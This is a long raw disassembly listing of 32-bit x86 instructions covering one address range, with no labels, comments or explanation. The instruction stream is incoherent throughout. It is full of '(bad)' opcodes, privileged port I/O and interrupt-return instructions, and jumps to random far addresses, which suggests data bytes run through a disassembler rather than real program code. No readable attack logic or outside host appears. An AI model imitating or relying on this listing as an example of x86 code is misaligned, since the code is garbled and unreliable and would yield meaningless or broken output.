  40fa36:	dec    DWORD PTR [ecx+0x4e]
  40fa39:	ds sub ah,al
  40fa3c:	or     dl,dh
  40fa3e:	push   0xffffffb7
  40fa40:	mov    DWORD PTR [ebx-0x72],ebp
  40fa43:	push   cs
  40fa44:	in     al,dx
  40fa45:	cmp    al,0x84
  40fa47:	or     DWORD PTR ds:0x8d654080,esi
  40fa4d:	mov    DWORD PTR [edx+0x3305267c],esi
  40fa53:	jno    0x40fac7
  40fa55:	call   0x3f8872c8
  40fa5a:	mov    al,ds:0xd5d6e45e
  40fa5f:	mov    dl,0x36
  40fa61:	xor    eax,ecx
  40fa63:	test   DWORD PTR [eax*2-0x675a9b4f],ebp
  40fa6a:	sub    eax,0xe8b3be19
  40fa6f:	cmp    ecx,esp
  40fa71:	dec    esp
  40fa72:	(bad)  
  40fa74:	cmp    dh,BYTE PTR cs:[esi]
  40fa77:	scas   eax,DWORD PTR es:[edi]
  40fa78:	cmp    DWORD PTR ds:0xff9c71c0,0xffffffb3
  40fa7f:	cmp    al,0x5c
  40fa81:	mov    ds:0x661168c9,al
  40fa86:	scas   al,BYTE PTR es:[edi]
  40fa87:	add    edi,DWORD PTR [ecx]
  40fa89:	jbe    0x40fae1
  40fa8b:	test   eax,0x6ace0180
  40fa90:	fdivp  st(3),st
  40fa92:	aas    
  40fa93:	or     ecx,ecx
  40fa95:	or     ah,bh
  40fa97:	repz pop esi
  40fa99:	scas   al,BYTE PTR es:[edi]
  40fa9a:	cmc    
  40fa9b:	retf   0x4547
  40fa9e:	mov    ebp,0x43480a0b
  40faa3:	xor    eax,0xd10d43de
  40faa8:	pop    ds
  40faa9:	adc    dh,ah
  40faab:	shl    ebx,0xae
  40faae:	lods   eax,DWORD PTR ds:[esi]
  40faaf:	enter  0xd34e,0xa5
  40fab3:	push   esp
  40fab4:	ja     0x40fac0
  40fab6:	inc    edx
  40fab7:	stos   BYTE PTR es:[edi],al
  40fab8:	lahf   
  40fab9:	sbb    edx,DWORD PTR ds:0x3a8db81f
  40fabf:	xor    al,0x72
  40fac1:	cmp    bh,BYTE PTR [esi-0x7155eef]
  40fac7:	aaa    
  40fac8:	fidiv  WORD PTR ds:[edi-0x4fd9ff62]
  40facf:	sub    cl,BYTE PTR [eax]
  40fad1:	loop   0x40fb3a
  40fad3:	jb     0x40fa8c
  40fad5:	and    al,0x7f
  40fad7:	call   FWORD PTR [ecx+ebx*8+0x9]
  40fadb:	mov    ch,0xde
  40fadd:	and    esi,DWORD PTR [eax+eiz*4-0x3776bc9a]
  40fae4:	dec    edi
  40fae5:	dec    esi
  40fae6:	es mov edi,0x5c79315e
  40faec:	popf   
  40faed:	pop    esi
  40faee:	xor    eax,0x97fcdb26
  40faf3:	stos   BYTE PTR es:[edi],al
  40faf4:	xor    eax,0x6f22bbd7
  40faf9:	xchg   ebx,eax
  40fafa:	dec    esp
  40fafb:	inc    ecx
  40fafc:	fwait
  40fafd:	shl    DWORD PTR [ebx+0x5],0xbe
  40fb01:	(bad)  
  40fb02:	arpl   WORD PTR [edi+0x6f2b04a4],bp
  40fb08:	shl    DWORD PTR [edi],0x9a
  40fb0b:	ja     0x40fb65
  40fb0d:	(bad)  
  40fb0e:	lock inc edx
  40fb10:	das    
  40fb11:	in     eax,0xb2
  40fb13:	jns    0x40fb23
  40fb15:	cli    
  40fb16:	sbb    BYTE PTR [esi-0x70957a5d],ah
  40fb1c:	push   0xffffffb0
  40fb1e:	mov    edi,0x539f9b97
  40fb23:	cli    
  40fb24:	jns    0x40fb44
  40fb26:	pop    edi
  40fb27:	add    al,0x4f
  40fb29:	mov    edi,0xae9664ad
  40fb2e:	adc    esi,esp
  40fb30:	cmc    
  40fb31:	and    dh,BYTE PTR [edi+esi*1-0x75247c27]
  40fb38:	inc    edi
  40fb39:	and    BYTE PTR [ecx+0x7ba5565e],dl
  40fb3f:	push   0x3e
  40fb41:	je     0x40fae7
  40fb43:	mov    bh,BYTE PTR [ecx]
  40fb45:	sbb    DWORD PTR [eax],eax
  40fb47:	ja     0x40fb17
  40fb49:	mov    dl,ch
  40fb4b:	mov    esp,0x3eade257
  40fb50:	sbb    BYTE PTR [edi],dl
  40fb52:	add    DWORD PTR [ecx],edx
  40fb54:	lea    esi,[esi+0x65d1c8a0]
  40fb5a:	inc    esi
  40fb5b:	mov    edx,0x80092d44
  40fb60:	dec    di
  40fb62:	lahf   
  40fb63:	je     0x40fbb4
  40fb65:	pusha  
  40fb66:	or     ecx,DWORD PTR [ebx+0x30]
  40fb69:	ins    DWORD PTR es:[edi],dx
  40fb6a:	cmp    al,0x11
  40fb6c:	mov    ds:0x75fe6d51,eax
  40fb71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb72:	sub    al,0xf
  40fb74:	xor    bh,BYTE PTR [edi]
  40fb76:	jecxz  0x40fb85
  40fb78:	jb     0x40fbd7
  40fb7a:	sti    
  40fb7b:	out    dx,al
  40fb7c:	fsub   DWORD PTR [esp+eiz*2-0x2d]
  40fb80:	push   ebx
  40fb81:	in     al,0xc8
  40fb83:	xchg   edx,eax
  40fb84:	loope  0x40fb45
  40fb86:	adc    bl,dh
  40fb88:	cmp    al,BYTE PTR [esi+esi*4]
  40fb8b:	lock cmp al,0xe8
  40fb8e:	js     0x40fb84
  40fb90:	lock jle 0x40fbb8
  40fb93:	jne    0x40fb1d
  40fb95:	aaa    
  40fb96:	pop    esp
  40fb97:	lock iret 
  40fb99:	xor    DWORD PTR [esi-0x21432a2b],ecx
  40fb9f:	xchg   ebp,eax
  40fba0:	retf   
  40fba1:	cmp    ah,BYTE PTR [ebx+0x65]
  40fba4:	sbb    eax,0x9efc43b9
  40fba9:	iret   
  40fbaa:	clc    
  40fbab:	push   ds
  40fbac:	daa    
  40fbad:	int3   
  40fbae:	xor    al,0x36
  40fbb0:	add    eax,0xd28642c1
  40fbb5:	cmp    cl,bh
  40fbb7:	fs scas eax,DWORD PTR es:[edi]
  40fbb9:	jmp    0xc490:0xe6250209
  40fbc0:	in     eax,0xa7
  40fbc2:	dec    edx
  40fbc3:	xchg   esi,eax
  40fbc4:	mov    bl,0xd2
  40fbc6:	inc    edi
  40fbc7:	xchg   edi,eax
  40fbc8:	enter  0x4930,0x43
  40fbcc:	out    dx,al
  40fbcd:	cli    
  40fbce:	mov    ds:0x4e5efe3c,al
  40fbd3:	push   esp
  40fbd4:	sbb    ch,dh
  40fbd6:	xchg   edi,eax
  40fbd7:	xchg   ebp,eax
  40fbd8:	(bad)  
  40fbda:	mov    eax,0x70703d42
  40fbdf:	pusha  
  40fbe0:	mov    cs,WORD PTR [ebx]
  40fbe2:	and    DWORD PTR [eax+0x46],esi
  40fbe5:	sti    
  40fbe6:	push   edi
  40fbe7:	dec    edx
  40fbe8:	es nop
  40fbea:	lahf   
  40fbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbec:	cmp    BYTE PTR [ecx-0x1f],cl
  40fbef:	and    al,0x9a
  40fbf1:	mov    ecx,gs
  40fbf3:	test   al,0x3b
  40fbf5:	push   0x10
  40fbf7:	mov    ebp,0xfff2b5f5
  40fbfc:	and    BYTE PTR [ebp+0x7fa796f],bh
  40fc02:	and    ecx,ebx
  40fc04:	lods   eax,DWORD PTR ds:[esi]
  40fc05:	adc    BYTE PTR [edx+0x562b1cfe],dl
  40fc0b:	outs   dx,BYTE PTR ds:[esi]
  40fc0c:	xchg   esi,eax
  40fc0d:	push   ds
  40fc0e:	xor    al,0x17
  40fc10:	int3   
  40fc11:	pop    ds
  40fc12:	add    al,0xd5
  40fc14:	shl    BYTE PTR [edx],cl
  40fc16:	scas   al,BYTE PTR es:[edi]
  40fc17:	cwde   
  40fc18:	xchg   edi,eax
  40fc19:	and    BYTE PTR [edx+0x4c],dh
  40fc1c:	hlt    
  40fc1d:	jmp    0x36f4d9b2
  40fc22:	push   esi
  40fc23:	fist   WORD PTR [edi+0x79]
  40fc26:	out    0x3d,eax
  40fc28:	mov    bh,0x94
  40fc2a:	and    esp,DWORD PTR [edx+edi*2]
  40fc2d:	inc    ecx
  40fc2e:	in     eax,0xaf
  40fc30:	rcl    DWORD PTR [ebx],0x3a
  40fc33:	out    0xa,eax
  40fc35:	sbb    al,dh
  40fc37:	push   ebx
  40fc38:	arpl   WORD PTR ds:0x9885c1bf,ax
  40fc3e:	(bad)  
  40fc3f:	fsub   st(3),st
  40fc41:	xchg   ebx,eax
  40fc42:	jmp    0x49d3dbd7
  40fc47:	stos   BYTE PTR es:[edi],al
  40fc48:	dec    esi
  40fc49:	mul    BYTE PTR [ebp-0x27511348]
  40fc4f:	repnz shr bh,0x3c
  40fc53:	scas   eax,DWORD PTR es:[edi]
  40fc54:	fisubr DWORD PTR [esi+0x4b]
  40fc57:	sub    DWORD PTR [esi+edx*2],ebx
  40fc5a:	jge    0x40fc65
  40fc5c:	inc    ecx
  40fc5d:	in     al,0xca
  40fc5f:	xor    ah,BYTE PTR [edx+0x3d3531a7]
  40fc65:	push   esi
  40fc66:	lds    esi,FWORD PTR [esi+0x375598e2]
  40fc6c:	in     al,0xc7
  40fc6e:	nop
  40fc6f:	imul   edi,DWORD PTR [ecx+0x44506d99],0xcea3461e
  40fc79:	jne    0x40fc05
  40fc7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc7c:	mul    BYTE PTR [esp+eiz*8+0x3f619726]
  40fc83:	or     DWORD PTR [edi-0x38620870],esp
  40fc89:	mov    bl,0xb3
  40fc8b:	ret    
  40fc8c:	sbb    DWORD PTR [eax],0xffffffaf
  40fc8f:	in     eax,dx
  40fc90:	idiv   DWORD PTR ds:0x57de5c6c
  40fc96:	jb     0x40fcb0
  40fc98:	(bad)  
  40fc99:	xchg   esi,eax
  40fc9a:	xchg   edi,eax
  40fc9b:	(bad)  
  40fc9d:	and    BYTE PTR [eax+0x3],dl
  40fca0:	scas   al,BYTE PTR es:[edi]
  40fca1:	jp     0x40fc3a
  40fca3:	cmp    DWORD PTR es:[edx-0x6b],eax
  40fca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fca8:	shr    DWORD PTR [edx],0xce
  40fcab:	and    dh,BYTE PTR [ebp+edi*8-0x56]
  40fcaf:	loope  0x40fc63
  40fcb1:	out    dx,al
  40fcb2:	mov    esp,0x2c0fbcc3
  40fcb7:	cmovle esi,edi
  40fcba:	cmp    dh,dh
  40fcbc:	lahf   
  40fcbd:	(bad)  
  40fcbe:	retf   
  40fcbf:	fcom   QWORD PTR [edi]
  40fcc1:	fdivr  st,st(5)
  40fcc3:	mov    bh,ah
  40fcc5:	fcomp  DWORD PTR ds:0xf367caf7
  40fccb:	mov    ebx,0xca21121b
  40fcd0:	in     eax,0x8c
  40fcd2:	fcmovne st,st(6)
  40fcd4:	mov    BYTE PTR [ebp-0x41d14021],dh
  40fcda:	test   dh,bl
  40fcdc:	dec    edi
  40fcdd:	shl    esi,1
  40fcdf:	add    eax,0xdce606c1
  40fce4:	push   es
  40fce5:	hlt    
  40fce6:	retf   
  40fce7:	test   DWORD PTR [ebx],ecx
  40fce9:	xchg   ebp,eax
  40fcea:	add    al,0x15
  40fcec:	dec    edx
  40fced:	cld    
  40fcee:	test   al,0x13
  40fcf0:	dec    edi
  40fcf1:	jp     0x40fd68
  40fcf3:	mov    ah,0x12
  40fcf5:	sbb    al,0x39
  40fcf7:	xchg   ebp,eax
  40fcf8:	imul   ebp,DWORD PTR [edx-0x75],0x8b359ffd
  40fcff:	dec    edx
  40fd00:	fxch   st(3)
  40fd02:	outs   dx,BYTE PTR ds:[esi]
  40fd03:	inc    ecx
  40fd04:	pop    ds
  40fd05:	scas   al,BYTE PTR es:[edi]
  40fd06:	ja     0x40fceb
  40fd08:	push   es
  40fd09:	or     BYTE PTR [esp+ecx*2-0xb],ah
  40fd0d:	cmp    esi,edx
  40fd0f:	mov    DWORD PTR [eax-0x6a],edi
  40fd12:	ret    0x718c
  40fd15:	retf   0xce55
  40fd18:	mov    ds:0x4cbadb66,eax
  40fd1d:	add    BYTE PTR es:[ebp+ebx*4-0x50],bl
  40fd22:	push   es
  40fd23:	push   ebp
  40fd24:	fwait
  40fd25:	aas    
  40fd26:	std    
  40fd27:	cmc    
  40fd28:	push   ecx
  40fd29:	pop    ebp
  40fd2a:	mov    ebp,0x85a411d8
  40fd2f:	pop    ds
  40fd30:	adc    esi,DWORD PTR [edx+ebx*2]
  40fd33:	into   
  40fd34:	leave  
  40fd35:	mov    WORD PTR [ebx-0x6f],cs
  40fd38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd39:	adc    DWORD PTR [esi-0xa37b43a],0x25e6e8fe
  40fd43:	je     0x40fd8a
  40fd45:	pop    eax
  40fd46:	or     eax,0xc6d04fc3
  40fd4b:	cmp    al,0x8a
  40fd4d:	ja     0x40fd39
  40fd4f:	mov    BYTE PTR [ebx+0x7],ah
  40fd52:	fadd   DWORD PTR [ebx+0x216e59f0]
  40fd58:	div    DWORD PTR [ebx+0x3]
  40fd5b:	cmp    al,0x9
  40fd5d:	jmp    0x48a460e4
  40fd62:	xchg   ebp,eax
  40fd63:	ret    
  40fd64:	mov    ?,WORD PTR [eax+0x7f011130]
  40fd6a:	mov    al,ds:0x2ed394a0
  40fd6f:	pop    ebp
  40fd71:	jo     0x40fd0d
  40fd73:	icebp  
  40fd74:	popa   
  40fd75:	mov    fs,WORD PTR [ecx-0x19d4948f]
  40fd7b:	mov    ch,dl
  40fd7d:	pusha  
  40fd7e:	sub    BYTE PTR [edi-0x1d],dl
  40fd81:	xor    esi,DWORD PTR [esi]
  40fd83:	mov    ch,0x9a
  40fd85:	outs   dx,BYTE PTR ds:[esi]
  40fd86:	cld    
  40fd87:	sar    BYTE PTR [ebx-0x22e7413f],cl
  40fd8d:	push   esp
  40fd8e:	xor    esi,DWORD PTR [ebp+eiz*4+0x4]
  40fd92:	shl    cl,0xc8
  40fd95:	push   DWORD PTR [ecx-0x59]
  40fd98:	add    DWORD PTR ds:0x7a36cc73,ebp
  40fd9e:	jo     0x40fd3d
  40fda0:	mov    dl,BYTE PTR [esi]
  40fda2:	mov    ebp,0xaedd8309
  40fda7:	je     0x40fdeb
  40fda9:	jecxz  0x40fd67
  40fdab:	sub    BYTE PTR [edx],al
  40fdad:	or     bh,BYTE PTR [ebx]
  40fdaf:	mov    eax,ds:0x2729598d
  40fdb4:	call   0x7997:0x6907ac7b
  40fdbb:	sub    eax,0x231d9df6
  40fdc0:	mov    eax,ds:0xf927c274
  40fdc5:	xlat   BYTE PTR ds:[ebx]
  40fdc6:	imul   esp,DWORD PTR [eax+ebp*2-0x54f2ce66],0x93ff7b8b
  40fdd1:	or     ebx,DWORD PTR [eax+0x54183da2]
  40fdd7:	fwait
  40fdd8:	(bad)  
  40fdda:	std    
  40fddb:	adc    ah,BYTE PTR [edx]
  40fddd:	fidiv  DWORD PTR [ebx-0x4b9f454]
  40fde3:	fistp  DWORD PTR [ebx+0x6a]
  40fde6:	icebp  
  40fde7:	or     ebx,DWORD PTR [esi+0x4]
  40fdea:	mov    BYTE PTR [edi-0x1e],al
  40fded:	add    ah,BYTE PTR [edx+ebp*1-0x6d]
  40fdf1:	and    ebp,ebx
  40fdf3:	mov    ah,0x3
  40fdf5:	gs pop eax
  40fdf7:	push   ecx
  40fdf8:	mov    dl,0x4f
  40fdfa:	mov    edi,0xa16fac18
  40fdff:	mov    al,ds:0x55d4bb99
  40fe04:	out    dx,eax
  40fe05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe06:	xchg   ebx,eax
  40fe07:	imul   edi,DWORD PTR [esi+ecx*4-0x73aab69a],0xffffff9f
  40fe0f:	sbb    eax,0x374a12a4
  40fe14:	aas    
  40fe15:	sbb    dl,BYTE PTR [ebp+0x57c525f]
  40fe1b:	cmp    eax,0x90235edc
  40fe20:	loop   0x40fdf1
  40fe22:	lahf   
  40fe23:	xchg   edx,eax
  40fe24:	add    ah,BYTE PTR [edi]
  40fe26:	out    dx,eax
  40fe27:	les    esi,FWORD PTR [eax+edi*4-0x7bc8b566]
  40fe2e:	leave  
  40fe2f:	push   0x3f
  40fe31:	jo     0x40fe34
  40fe33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe34:	jne    0x40fe95
  40fe36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe37:	js     0x40fdfd
  40fe39:	mov    BYTE PTR [ecx+0x4f97d316],0xd6
  40fe40:	sahf   
  40fe41:	adc    edi,0x3c
  40fe44:	inc    edx
  40fe45:	or     eax,0xf641abe1
  40fe4a:	xchg   esi,eax
  40fe4b:	out    0xe8,eax
  40fe4d:	stc    
  40fe4e:	jecxz  0x40fe8e
  40fe50:	cmp    DWORD PTR [eax-0x3da60213],esi
  40fe56:	rcl    ah,0xc9
  40fe59:	pushf  
  40fe5a:	test   dh,dh
  40fe5c:	pop    ebp
  40fe5d:	fmul   QWORD PTR [edx]
  40fe5f:	loope  0x40fe84
  40fe61:	adc    bh,ch
  40fe63:	fisttp WORD PTR [edi+0x4a]
  40fe66:	test   eax,0xd424cfbf
  40fe6b:	loopne 0x40fe1b
  40fe6d:	pop    ss
  40fe6e:	dec    edx
  40fe6f:	mov    edx,0xc345c022
  40fe74:	adc    dl,ch
  40fe76:	jmp    0x40fef3
  40fe78:	test   DWORD PTR [esi-0x5e],edi
  40fe7b:	push   0xaa367257
  40fe80:	sub    cl,bl
  40fe82:	pop    edx
  40fe83:	or     al,0x3
  40fe85:	pop    edx
  40fe86:	jnp    0x40fe36
  40fe88:	scas   al,BYTE PTR es:[edi]
  40fe89:	enter  0x8c8d,0xa2
  40fe8d:	div    edx
  40fe8f:	xor    DWORD PTR [ebp-0x6ce47f64],ecx
  40fe95:	xchg   edx,eax
  40fe96:	(bad)  
  40fe97:	jae    0x40fe20
  40fe99:	mov    ?,WORD PTR ds:0x41206239
  40fe9f:	call   0xd7faa383
  40fea4:	and    DWORD PTR [edx+0x644d9dc8],0xffffffda
  40feab:	ret    
  40feac:	sti    
  40fead:	shr    bl,1
  40feaf:	xor    ebp,DWORD PTR [bp+di+0xc]
  40feb3:	verr   WORD PTR [ebx+eiz*2-0x6f391a07]
  40febb:	push   edx
  40febc:	retf   
  40febd:	pop    edx
  40febe:	push   0xffffff85
  40fec0:	dec    ebp
  40fec1:	ins    BYTE PTR es:[edi],dx
  40fec2:	clc    
  40fec3:	or     al,0x9f
  40fec5:	hlt    
  40fec6:	lds    ebx,FWORD PTR [edi]
  40fec8:	(bad)  
  40fec9:	sub    BYTE PTR [esi-0x65],ch
  40fecc:	and    al,0x35
  40fece:	das    
  40fecf:	mov    ds:0x5c53cca,eax
  40fed4:	jb     0x40fef6
  40fed6:	daa    
  40fed7:	or     DWORD PTR [edx+0x1],ecx
  40feda:	sbb    al,0x7
  40fedc:	div    BYTE PTR [ebx-0x1667e6c6]
  40fee2:	in     eax,dx
  40fee3:	or     ebx,esi
  40fee5:	or     eax,eax
  40fee7:	mov    BYTE PTR [edx-0x65],al
  40feea:	stc    
  40feeb:	test   BYTE PTR [edi+eax*4-0x60],bl
  40feef:	and    BYTE PTR [ecx+0xffe68a1],ah
  40fef5:	loopne 0x40ff41
  40fef7:	pushf  
  40fef8:	jnp    0x40fe7a
  40fefa:	fwait
  40fefb:	xlat   BYTE PTR ds:[ebx]
  40fefc:	sbb    al,0xa8
  40fefe:	jmp    0x40fec0
  40ff00:	jmp    0x57ea1552
  40ff05:	mov    dh,0x5a
  40ff07:	sbb    BYTE PTR [esi+0x5c6db473],al
  40ff0d:	sbb    BYTE PTR [ebx-0x24],dl
  40ff10:	mov    ds:0xf9abc06,eax
  40ff15:	sub    eax,0xd575a4c5
  40ff1a:	xchg   esi,eax
  40ff1b:	mov    WORD PTR [edi-0x7ca9f5a8],fs
  40ff21:	xor    BYTE PTR [edi],bl
  40ff23:	ror    DWORD PTR [edx+0x145f291],1
  40ff29:	sbb    DWORD PTR [ecx-0x19],eax
  40ff2c:	mov    edx,0x9bb07cd4
  40ff31:	mov    eax,0xbc91ffbc
  40ff36:	adc    DWORD PTR [edi],eax
  40ff38:	lds    ecx,FWORD PTR [ebx+0x303bccb6]
  40ff3e:	mov    WORD PTR [ebx],ds
  40ff40:	pop    ebp
  40ff41:	dec    ebp
  40ff42:	pusha  
  40ff43:	int    0x3c
  40ff45:	sar    BYTE PTR [ecx],0x12
  40ff48:	pop    ss
  40ff49:	jmp    0xd7c4:0xefe7b732
  40ff50:	test   eax,0xf75051e7
  40ff55:	pop    ds
  40ff56:	cmc    
  40ff57:	popa   
  40ff58:	ins    BYTE PTR es:[edi],dx
  40ff59:	dec    eax
  40ff5a:	jbe    0x40ff96
  40ff5c:	(bad)  
  40ff5e:	fld    DWORD PTR [edi]
  40ff60:	outs   dx,BYTE PTR ds:[esi]
  40ff61:	and    DWORD PTR [edx-0x57],0xffffffed
  40ff65:	retf   
  40ff66:	and    al,0x7b
  40ff68:	pop    ecx
  40ff69:	imul   edx,DWORD PTR [ebx],0x8fb39558
  40ff6f:	push   0x11191365
  40ff74:	jo     0x40ffd4
  40ff76:	xchg   DWORD PTR [edi+0x2dcc6e3d],ebx
  40ff7c:	and    al,0x66
  40ff7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff7f:	sub    al,0xaf
  40ff81:	jmp    esp
  40ff83:	xchg   ebx,eax
  40ff84:	sbb    eax,0xcf3b6857
  40ff89:	cmp    DWORD PTR [esi-0x70dfd63b],0x61e61778
  40ff93:	pop    esp
  40ff94:	pusha  
  40ff95:	xor    cl,BYTE PTR [esi-0x2b27340a]
  40ff9b:	loopne 0x40ff20
  40ff9d:	cmp    bh,ch
  40ff9f:	inc    edi
  40ffa0:	outs   dx,BYTE PTR ds:[esi]
  40ffa1:	inc    DWORD PTR [esi+esi*1-0x3a]
  40ffa5:	mov    ds:0xf938e519,eax
  40ffaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffab:	push   es
  40ffac:	mov    ch,0xbd
  40ffae:	rcl    BYTE PTR [ebx+0x14],1
  40ffb1:	stc    
  40ffb2:	out    dx,al
  40ffb3:	inc    ebp
  40ffb4:	fmul   QWORD PTR [eax+0x43056088]
  40ffba:	gs cmc 
  40ffbc:	pop    ss
  40ffbd:	jb     0x40ffed
  40ffbf:	test   BYTE PTR [esi+ebx*4],ah
  40ffc2:	lods   al,BYTE PTR ds:[esi]
  40ffc3:	pop    ecx
  40ffc4:	cld    
  40ffc5:	pop    edx
  40ffc6:	aas    
  40ffc7:	inc    edx
  40ffc8:	xchg   ebp,eax
  40ffc9:	jbe    0x40ffe0
  40ffcb:	mov    esp,0x7d1e293f
  40ffd0:	push   edx
  40ffd1:	ret    0xa1c3
  40ffd4:	(bad)  
  40ffd5:	in     al,dx
  40ffd6:	dec    edi
  40ffd7:	xor    DWORD PTR ds:0x759e1184,esp
  40ffdd:	dec    ebp
  40ffde:	xchg   edi,eax
  40ffdf:	jle    0x40ff66
  40ffe1:	stos   DWORD PTR es:[edi],eax
  40ffe2:	push   ebp
  40ffe3:	jl     0x41002d
  40ffe5:	add    eax,edx
  40ffe7:	shl    DWORD PTR [esi],0xf7
  40ffea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffeb:	cmp    al,0xed
  40ffed:	adc    dh,BYTE PTR [ecx-0x3a]
  40fff0:	dec    ebp
  40fff1:	mov    BYTE PTR ds:0xdabeaa4b,0xc5
  40fff8:	bound  esp,QWORD PTR [eax+0x5b3d6dc1]
  40fffe:	inc    edx
  40ffff:	mov    ebp,DWORD PTR ds:0x95e48cc5
  410005:	popf   
  410006:	popf   
  410007:	xchg   esp,eax
  410008:	inc    ebx
  410009:	into   
  41000a:	inc    ecx
  41000b:	cmp    bl,dl
  41000d:	daa    
  41000e:	mov    edx,0xf73059dd
  410013:	push   ebx
  410014:	mov    al,0x54
  410016:	xchg   ebp,eax
  410017:	and    eax,0x70310715
  41001c:	iret   
  41001d:	daa    
  41001e:	lods   eax,DWORD PTR ds:[esi]
  41001f:	dec    eax
  410020:	scas   eax,DWORD PTR es:[edi]
  410021:	push   cs
  410022:	imul   eax,DWORD PTR [ebp+0x56],0xffffff8e
  410026:	ss ins BYTE PTR es:[edi],dx
  410028:	je     0x410023
  41002a:	dec    ebx
  41002b:	ffreep st(2)
  41002d:	aaa    
  41002e:	iret   
  41002f:	es jmp 0x5ed66a02
  410035:	mov    edx,0x1dab1aa2
  41003a:	xlat   BYTE PTR ds:[ebx]
  41003b:	adc    BYTE PTR [edi-0x55],dl
  41003e:	mov    ch,dh
  410040:	jmp    0xe18d:0x915eb2f6
  410047:	cmp    bh,BYTE PTR [esi+0x73528c85]
  41004d:	clc    
  41004e:	dec    eax
  41004f:	rcl    BYTE PTR [ebx+esi*8-0x29341464],0x3b
  410057:	inc    ebp
  410058:	loope  0x410020
  41005a:	dec    ecx
  41005b:	or     BYTE PTR [ebx+0x6d],ch
  41005e:	ja     0x410068
  410060:	inc    edx
  410061:	cmp    ebx,DWORD PTR [ebp+0x71841351]
  410067:	adc    ebx,DWORD PTR [ecx-0x630944ee]
  41006d:	mov    DWORD PTR [esi-0x31],esi
  410070:	mov    eax,ds:0x5d46622b
  410075:	retf   
  410076:	cmp    al,0x7f
  410078:	and    al,0x78
  41007a:	enter  0x4f7f,0x8c
  41007e:	loop   0x410082
  410080:	int3   
  410081:	mov    bh,0xe3
  410083:	or     ebp,esi
  410085:	sti    
  410086:	hlt    
  410087:	mov    eax,ds:0x70457323
  41008c:	mov    al,ds:0xf57d72f0
  410091:	(bad)  
  410092:	jmp    0x410049
  410094:	dec    ebx
  410095:	mov    ebp,0xff1ee21a
  41009a:	popa   
  41009b:	dec    ebx
  41009c:	ins    BYTE PTR es:[edi],dx
  41009d:	pop    eax
  41009e:	mov    eax,ds:0x93d8b471
  4100a3:	add    al,0xd6
  4100a5:	mov    al,ds:0xfc1e5f10
  4100aa:	xchg   edi,eax
  4100ab:	adc    al,0xe7
  4100ad:	mov    edx,0x2025a52e
  4100b2:	push   esp
  4100b3:	jmp    0x153f:0xf73efc53
  4100ba:	sbb    dl,BYTE PTR [edx]
  4100bc:	retf   
  4100bd:	repz lds ecx,FWORD PTR [ebp-0x77ae77f3]
  4100c4:	lahf   
  4100c5:	not    edi
  4100c7:	sbb    esp,DWORD PTR [eax+0x59ffe6b9]
  4100cd:	hlt    
  4100ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100cf:	leave  
  4100d0:	hlt    
  4100d1:	(bad)  
  4100d2:	jo     0x410065
  4100d4:	test   eax,0x2c4c200c
  4100d9:	(bad)  
  4100da:	icebp  
  4100db:	jae    0x410096
  4100dd:	enter  0x2252,0x55
  4100e1:	fsub   QWORD PTR [ebp+0x31]
  4100e4:	sub    ch,BYTE PTR [eax+0x6a]
  4100e7:	push   esi
  4100e8:	xchg   ecx,eax
  4100e9:	in     al,0x20
  4100eb:	inc    eax
  4100ec:	aam    0x5a
  4100ee:	jmp    0x410143
  4100f0:	loop   0x4100c6
  4100f2:	mov    DWORD PTR [ecx+0x7ddb7c43],0x8fcaea7e
  4100fc:	ret    
  4100fd:	push   esp
  4100fe:	les    eax,FWORD PTR [ebp+0x5084509c]
  410104:	mov    ebp,0x8fd97185
  410109:	pop    es
  41010a:	repz jbe 0x410173
  41010d:	ja     0x410167
  41010f:	cmp    BYTE PTR [edi+ecx*4+0x197623b7],0xda
  410117:	adc    esp,DWORD PTR [ebx]
  410119:	ror    al,cl
  41011b:	inc    eax
  41011c:	ror    edi,0x7b
  41011f:	add    bh,BYTE PTR [edx+0x48be8ed8]
  410125:	stc    
  410126:	mov    ch,dl
  410128:	push   es
  410129:	add    ch,al
  41012b:	mov    ecx,0x47530f79
  410130:	dec    eax
  410131:	loop   0x410187
  410133:	outs   dx,BYTE PTR ds:[esi]
  410134:	icebp  
  410135:	(bad)  
  410136:	xchg   edi,eax
  410137:	jno    0x410151
  410139:	and    al,0xe
  41013b:	push   edi
  41013c:	xchg   ecx,eax
  41013d:	(bad)
  410140:	mov    ah,0xa2
  410142:	cld    
  410143:	(bad)  
  410144:	cld    
  410145:	test   dl,dh
  410147:	jl     0x410122
  410149:	jae    0x4100d4
  41014b:	nop
  41014c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014d:	stos   DWORD PTR es:[edi],eax
  41014e:	clc    
  41014f:	(bad)  
  410150:	hlt    
  410151:	std    
  410152:	xchg   ebp,eax
  410153:	retf   
  410154:	out    0x5a,eax
  410156:	xchg   edi,eax
  410157:	inc    esi
  410158:	xchg   BYTE PTR [esi+eax*2+0x79edea43],al
  41015f:	adc    esi,DWORD PTR [edx+0x3412c600]
  410165:	repnz imul eax,DWORD PTR [ebx+0x1474278a],0x51
  41016d:	pop    edi
  41016e:	stos   BYTE PTR es:[edi],al
  41016f:	mov    ss,WORD PTR [edi+eax*2+0x51]
  410173:	fadd   QWORD PTR [edx+0x2ed11121]
  410179:	leave  
  41017a:	lea    esp,[edx+ebp*8]
  41017d:	adc    DWORD PTR [edi],ebp
  41017f:	inc    ecx
  410180:	sahf   
  410181:	jns    0x410187
  410183:	nop
  410184:	inc    esp
  410185:	jle    0x4101d9
  410187:	out    0xbe,al
  410189:	push   eax
  41018a:	mov    bl,0xd0
  41018c:	sbb    DWORD PTR ds:0x21c59928,esi
  410192:	sbb    dl,BYTE PTR [eax-0x44]
  410195:	push   cs
  410196:	rol    DWORD PTR [esp+edx*2+0x4c3f688d],0x5a
  41019e:	and    eax,0x774d8dd1
  4101a3:	cmp    dh,BYTE PTR ds:0xfab67da4
  4101a9:	adc    al,0x63
  4101ab:	dec    ebx
